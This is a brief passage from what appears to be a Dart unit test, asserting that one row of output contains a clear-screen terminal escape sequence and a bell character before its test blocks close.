      expect(rows[3], contains('<U+001B>[2J<U+0007>'));
    });
  });
}
